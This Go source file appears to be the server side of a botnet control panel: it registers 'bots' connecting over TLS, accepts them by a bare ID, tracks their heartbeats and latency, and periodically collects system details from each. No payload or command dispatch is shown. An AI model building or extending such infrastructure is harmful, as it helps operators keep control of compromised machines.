package main

import (
	"bytes"
	"crypto/tls"
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"
)

// bot registry
type botReg struct {
	bots   map[string]*tls.Conn
	byAddr map[string]string // remote addr -> botID
	mu     sync.RWMutex
}

func newBotReg() *botReg {
	return &botReg{
		bots:   make(map[string]*tls.Conn),
		byAddr: make(map[string]string),
	}
}

func (r *botReg) Add(id string, c *tls.Conn) {
	r.mu.Lock()
	defer r.mu.Unlock()
	if old, ok := r.bots[id]; ok && old != nil {
		old.Close()
		for k, v := range r.byAddr {
			if v == id {
				delete(r.byAddr, k)
			}
		}
	}
	r.bots[id] = c
	r.byAddr[c.RemoteAddr().String()] = id
	pulse.touch(id, time.Now(), 0)
}

func (r *botReg) Remove(id string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	if c, ok := r.bots[id]; ok {
		delete(r.bots, id)
		for k, v := range r.byAddr {
			if v == id {
				delete(r.byAddr, k)
				break
			}
		}
		if c != nil {
			c.Close()
		}
		pulse.remove(id)
	}
}

func (r *botReg) Lookup(c net.Conn) string {
	r.mu.RLock()
	defer r.mu.RUnlock()
	return r.byAddr[c.RemoteAddr().String()]
}

func (r *botReg) Get(id string) (*tls.Conn, bool) {
	r.mu.RLock()
	defer r.mu.RUnlock()
	c, ok := r.bots[id]
	return c, ok
}

func (r *botReg) All() map[string]*tls.Conn {
	r.mu.RLock()
	defer r.mu.RUnlock()
	cp := make(map[string]*tls.Conn, len(r.bots))
	for id, c := range r.bots {
		cp[id] = c
	}
	return cp
}

func (r *botReg) Count() int {
	r.mu.RLock()
	defer r.mu.RUnlock()
	return len(r.bots)
}

func (r *botReg) Sweep() {
	r.mu.Lock()
	defer r.mu.Unlock()
	for id, c := range r.bots {
		if c == nil {
			delete(r.bots, id)
			pulse.remove(id)
			for k, v := range r.byAddr {
				if v == id {
					delete(r.byAddr, k)
					break
				}
			}
			continue
		}
		c.SetWriteDeadline(time.Now().Add(1 * time.Second))
		if _, err := c.Write([]byte{}); err != nil {
			delete(r.bots, id)
			pulse.remove(id)
			for k, v := range r.byAddr {
				if v == id {
					delete(r.byAddr, k)
					break
				}
			}
			c.Close()
		}
		c.SetWriteDeadline(time.Time{})
	}
}

// heartbeat / pulse tracking
const (
	lagWindow     = 1 * time.Minute
	offlineWindow = 2 * time.Minute
)

type pulseInfo struct {
	At   time.Time
	Ping time.Duration
	Tag  string
}

type pulseTracker struct {
	data map[string]*pulseInfo
	mu   sync.RWMutex
}

var pulse = &pulseTracker{data: make(map[string]*pulseInfo)}

func (p *pulseTracker) touch(id string, t time.Time, ping time.Duration) {
	p.mu.Lock()
	defer p.mu.Unlock()
	if e, ok := p.data[id]; ok {
		e.At = t
		if ping > 0 {
			e.Ping = ping
		}
	} else {
		p.data[id] = &pulseInfo{At: t, Ping: ping, Tag: "ONLINE"}
	}
}

func (p *pulseTracker) remove(id string) {
	p.mu.Lock()
	defer p.mu.Unlock()
	delete(p.data, id)
}

func (p *pulseTracker) liveCount() int {
	p.mu.RLock()
	defer p.mu.RUnlock()
	now := time.Now()
	n := 0
	for _, e := range p.data {
		if _, live := classify(now.Sub(e.At)); live {
			n++
		}
	}
	return n
}

func (p *pulseTracker) refresh() {
	p.mu.Lock()
	defer p.mu.Unlock()
	now := time.Now()
	for _, e := range p.data {
		s, _ := classify(now.Sub(e.At))
		e.Tag = s
	}
}

func (p *pulseTracker) summary() map[string]int {
	out := map[string]int{"ONLINE": 0, "LAGGING": 0, "OFFLINE": 0, "TOTAL": 0}
	p.mu.RLock()
	now := time.Now()
	for _, e := range p.data {
		s, live := classify(now.Sub(e.At))
		out[s]++
		if live {
			out["TOTAL"]++
		}
	}
	p.mu.RUnlock()
	if out["TOTAL"] == 0 {
		botDB.mu.RLock()
		n := 0
		fb := time.Now()
		for _, b := range botDB.entries {
			if fb.Sub(b.LastPing) <= offlineWindow {
				n++
			}
		}
		botDB.mu.RUnlock()
		if n > 0 {
			out["ONLINE"] = n
			out["TOTAL"] = n
		}
	}
	return out
}

type detailEntry struct {
	Status string
	At     time.Time
	PingMs int64
	Live   bool
}

func (p *pulseTracker) details() map[string]detailEntry {
	p.mu.RLock()
	defer p.mu.RUnlock()
	out := make(map[string]detailEntry)
	now := time.Now()
	for id, e := range p.data {
		s, live := classify(now.Sub(e.At))
		out[id] = detailEntry{Status: s, At: e.At, PingMs: e.Ping.Milliseconds(), Live: live}
	}
	return out
}

func classify(d time.Duration) (string, bool) {
	switch {
	case d > offlineWindow:
		return "OFFLINE", false
	case d > lagWindow:
		return "LAGGING", true
	default:
		return "ONLINE", true
	}
}

func runPulseCheck() {
	t := time.NewTicker(30 * time.Second)
	go func() {
		for range t.C {
			pulse.refresh()
		}
	}()
}

// bot info database
type botDatabase struct {
	entries map[string]botEntry
	mu      sync.RWMutex
}

var botDB = &botDatabase{entries: make(map[string]botEntry)}

func (db *botDatabase) upsert(id string, addr net.Addr, info sysInfo) {
	db.mu.Lock()
	defer db.mu.Unlock()
	e, ok := db.entries[id]
	if !ok {
		e = botEntry{ID: id, ConnAt: time.Now()}
	}
	if e.ConnAt.IsZero() {
		e.ConnAt = time.Now()
	}
	if ta, ok := addr.(*net.TCPAddr); ok && ta.IP != nil {
		e.IP = ta.IP.String()
	}
	e.LastPing = time.Now()
	e.Status = "ONLINE"
	e.Sys = info
	db.entries[id] = e
}

func (db *botDatabase) updatePing(id string, d time.Duration) {
	db.mu.Lock()
	defer db.mu.Unlock()
	if e, ok := db.entries[id]; ok {
		e.LastPing = time.Now()
		if d >= 0 {
			e.PingMs = d.Milliseconds()
		}
		e.Status = "ONLINE"
		db.entries[id] = e
		return
	}
	ms := int64(0)
	if d >= 0 {
		ms = d.Milliseconds()
	}
	db.entries[id] = botEntry{ID: id, ConnAt: time.Now(), LastPing: time.Now(), Status: "ONLINE", PingMs: ms}
}

func (db *botDatabase) recordConn(id string, addr net.Addr) {
	db.mu.Lock()
	defer db.mu.Unlock()
	e, ok := db.entries[id]
	if !ok {
		e = botEntry{ID: id, ConnAt: time.Now()}
	}
	if e.ConnAt.IsZero() {
		e.ConnAt = time.Now()
	}
	if ta, ok := addr.(*net.TCPAddr); ok && ta.IP != nil {
		e.IP = ta.IP.String()
	}
	e.LastPing = time.Now()
	e.Status = "ONLINE"
	db.entries[id] = e
}

func (db *botDatabase) drop(id string) {
	db.mu.Lock()
	delete(db.entries, id)
	db.mu.Unlock()
}

func activeBots() []botEntry {
	db := botDB
	db.mu.RLock()
	snap := make(map[string]botEntry, len(db.entries))
	for id, e := range db.entries {
		snap[id] = e
	}
	db.mu.RUnlock()

	hb := pulse.details()
	now := time.Now()
	var out []botEntry
	for id, e := range snap {
		if d, ok := hb[id]; ok {
			if !d.Live {
				continue
			}
			e.Status = d.Status
			e.LastPing = d.At
			e.PingMs = d.PingMs
			out = append(out, e)
			continue
		}
		if now.Sub(e.LastPing) > offlineWindow {
			continue
		}
		out = append(out, e)
	}
	return out
}

// diagnostics

type diagData struct {
	OS        [16]byte
	Arch      [8]byte
	CPU       [32]byte
	RAM       uint64
	Uptime    uint64
	Timestamp int64
	Load1     float32
	Load5     float32
	Load15    float32
	DiskUsage uint64
}

func requestDiag(c net.Conn) error {
	return sendPkt(c, mkPacket(pktDiag, []byte{}))
}

func handleDiag(id string, c net.Conn, p pkt) {
	if len(p.Data) < 101 {
		return
	}
	var d diagData
	copy(d.OS[:], p.Data[0:16])
	copy(d.Arch[:], p.Data[16:24])
	copy(d.CPU[:], p.Data[24:56])
	d.RAM = binary.BigEndian.Uint64(p.Data[56:64])
	d.Uptime = binary.BigEndian.Uint64(p.Data[64:72])
	d.Load1 = float32(binary.BigEndian.Uint32(p.Data[80:84])) / 100.0
	d.Load5 = float32(binary.BigEndian.Uint32(p.Data[84:88])) / 100.0
	d.Load15 = float32(binary.BigEndian.Uint32(p.Data[88:92])) / 100.0
	d.DiskUsage = binary.BigEndian.Uint64(p.Data[92:100])

	strip := func(b []byte) string { return strings.TrimSpace(string(bytes.TrimRight(b, "\x00"))) }

	info := sysInfo{
		OS: strip(d.OS[:]), Arch: strip(d.Arch[:]), CPU: strip(d.CPU[:]),
		RAM: fmt.Sprintf("%d MB", d.RAM), Uptime: fmt.Sprintf("%d seconds", d.Uptime),
		Load1: fmt.Sprintf("%.2f", d.Load1), Load5: fmt.Sprintf("%.2f", d.Load5),
		Load15: fmt.Sprintf("%.2f", d.Load15), Disk: fmt.Sprintf("%d MB", d.DiskUsage),
	}
	botDB.upsert(id, c.RemoteAddr(), info)
}

func scheduleDiags() {
	t := time.NewTicker(5 * time.Minute)
	defer t.Stop()
	for range t.C {
		for _, c := range bots.All() {
			go requestDiag(c)
		}
	}
}

// bot connection handler
func handleBot(c *tls.Conn) {
	defer c.Close()
	id, err := authBot(c)
	if err != nil {
		logBotConn(c.RemoteAddr().String(), false)
		logSys("warn", "bot_auth_fail", map[string]interface{}{"ip": c.RemoteAddr().String(), "err": err.Error()})
		return
	}
	bots.Add(id, c)
	botDB.recordConn(id, c.RemoteAddr())
	defer func() {
		bots.Remove(id)
		pulse.remove(id)
		botDB.drop(id)
		logBotConn(c.RemoteAddr().String(), false)
	}()

	logBotConn(c.RemoteAddr().String(), true)
	pulse.touch(id, time.Now(), 0)

	stop := make(chan struct{})
	go pingLoop(c, id, stop)
	defer close(stop)

	requestDiag(c)

	for {
		p, err := recvPkt(c)
		if err != nil {
			return
		}
		handleBotPkt(c, p, id)
	}
}

func authBot(c net.Conn) (string, error) {
	c.SetReadDeadline(time.Now().Add(10 * time.Second))
	defer c.SetReadDeadline(time.Time{})
	p, err := recvPkt(c)
	if err != nil {
		return "", fmt.Errorf("auth read: %w", err)
	}
	if p.Hdr.Type != pktAuth {
		return "", fmt.Errorf("expected auth pkt, got %d", p.Hdr.Type)
	}
	id := string(p.Data)
	if id == "" {
		return "", errors.New("empty bot id")
	}
	resp := mkPacket(pktAuthResp, []byte("OK"))
	if err := sendPkt(c, resp); err != nil {
		return "", fmt.Errorf("auth reply: %w", err)
	}
	return id, nil
}

var pingTracker sync.Map

func handleBotPkt(c net.Conn, p pkt, id string) {
	switch p.Hdr.Type {
	case pktPong:
		if id == "" {
			id = bots.Lookup(c)
		}
		var d time.Duration = -1
		if v, ok := pingTracker.LoadAndDelete(id); ok {
			d = time.Since(v.(time.Time))
		}
		pulse.touch(id, time.Now(), d)
		botDB.updatePing(id, d)
	case pktDiag:
		handleDiag(id, c, p)
	case pktHeartbeat:
		if id == "" {
			id = bots.Lookup(c)
		}
		pulse.touch(id, time.Now(), 0)
		botDB.updatePing(id, -1)
	}
}

func pingLoop(c net.Conn, id string, stop <-chan struct{}) {
	t := time.NewTicker(30 * time.Second)
	defer t.Stop()
	for {
		select {
		case <-t.C:
			pp := mkPacket(pktPing, nil)
			pingTracker.Store(id, time.Now())
			if sendPkt(c, pp) != nil {
				return
			}
		case <-stop:
			return
		}
	}
}

func botCount() int {
	n := len(activeBots())
	if n == 0 {
		n = pulse.liveCount()
	}
	if n == 0 {
		n = bots.Count()
	}
	return n
}
